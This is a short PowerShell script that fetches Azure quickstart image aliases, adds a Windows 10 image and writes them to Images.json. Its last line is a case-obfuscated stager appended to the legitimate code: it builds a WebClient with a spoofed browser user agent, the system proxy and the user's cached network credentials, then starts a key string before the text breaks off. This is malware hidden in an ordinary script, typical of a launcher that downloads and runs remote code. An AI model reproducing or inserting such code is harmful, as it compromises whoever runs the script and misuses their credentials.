
$aliaspage = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Azure/azure-rest-api-specs/master/arm-compute/quickstart-templates/aliases.json" -TimeoutSec 5
$parsedJson = $aliaspage.Content | ConvertFrom-Json

$win10Image = @"
{
    "publisher": "MicrosoftVisualStudio",
    "offer": "Windows",
    "sku": "Windows-10-N-x64",
    "version": "latest"
}
"@

$parsedJson.Outputs.Aliases.Value.Windows | Add-Member -Name "Win10" -Value (ConvertFrom-Json $win10Image) -MemberType NoteProperty

ConvertTo-Json $parsedJson.Outputs.Aliases.Value | Set-Content -Path $PSScriptRoot/Images.json
$Wc=NEW-ObJeCT SySTem.Net.WeBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAderS.Add('User-Agent',$u);$Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy;$Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS;$K='/j(\wly4+aW

